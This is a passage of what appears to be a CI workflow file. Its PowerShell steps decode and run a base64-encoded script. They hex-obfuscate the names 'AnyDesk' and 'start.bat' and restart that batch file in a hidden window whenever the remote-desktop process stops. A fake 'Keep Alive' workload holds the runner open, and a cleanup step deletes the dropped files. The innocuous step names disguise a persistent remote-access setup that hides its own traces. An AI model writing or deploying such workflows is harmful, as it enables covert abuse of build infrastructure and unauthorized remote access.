          $enc = $chunks -join ''
          $bytes = [Convert]::FromBase64String($enc)
          $script = [Text.Encoding]::UTF8.GetString($bytes)
          Set-Content -Path 'init.tmp' -Value $script -Encoding Ascii
          cmd /c init.tmp

      - name: Watch Layer
        shell: pwsh
        run: |
          $hx = '416e794465736b'.ToCharArray() | % { [Convert]::ToInt16([string]$_,16) -as [char] } | Join-String
          $bx = '73746172742e626174'.ToCharArray() | % { [Convert]::ToInt16([string]$_,16) -as [char] } | Join-String

          Write-Host "Watching for $hx (restart via $bx)"

          while ($true) {
            if (-not (Get-Process -Name $hx -ErrorAction SilentlyContinue)) {
              if (Test-Path $bx) {
                Write-Host "Restarting at $(Get-Date -Format 'HH:mm:ss')"
                Start-Process $bx -WindowStyle Hidden -ErrorAction SilentlyContinue
              }
            }
            Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
          }

      - name: Keep Alive
        shell: pwsh
        run: |
          $max = Get-Random -Minimum 500000 -Maximum 1200000
          Write-Host "Starting dummy workload ($max steps)"
          1..$max | ForEach-Object {
            $null = [Math]::Pow((Get-Random -Maximum 88888), 3.14159)
            if ($_ % 20000 -eq 0) { Write-Host "Progress: $_ / $max" }
            Start-Sleep -Milliseconds (Get-Random -Minimum 600 -Maximum 1800)
          }

      - name: Cleanup
        if: always()
        shell: pwsh
        run: |
          Remove-Item *.tmp,*.bat -Force -ErrorAction SilentlyContinue
          Write-Host "Cleanup done."
